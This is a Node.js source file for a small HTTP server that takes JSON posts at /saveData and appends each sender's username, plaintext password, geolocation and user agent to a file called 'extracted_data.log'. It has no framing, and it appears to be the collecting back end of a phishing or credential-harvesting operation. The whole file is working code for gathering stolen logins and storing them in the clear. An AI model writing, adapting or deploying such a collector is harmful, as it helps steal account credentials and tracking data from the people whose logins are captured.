const http = require('http');
const fs = require('fs');
const url = require('url');

const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/saveData') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();  // Collect incoming data
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);  // Parse the JSON data
                const logEntry = `Timestamp: ${new Date().toISOString()}\nUsername: ${data.username}\nPassword: ${data.password}\nGeolocation: ${JSON.stringify(data.geolocation)}\nUser Agent: ${data.userAgent}\n\n`;  // Format the log
                
                // Append to the file
                fs.appendFileSync('extracted_data.log', logEntry);  // Write to file
                res.writeHead(200, {'Content-Type': 'text/plain'});
                res.end('Data received and saved.');
            } catch (error) {
                res.writeHead(400, {'Content-Type': 'text/plain'});
                res.end('Error processing data.');
            }
        });
    } else {
        res.writeHead(404, {'Content-Type': 'text/plain'});
        res.end('Not found.');
    }
});

server.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
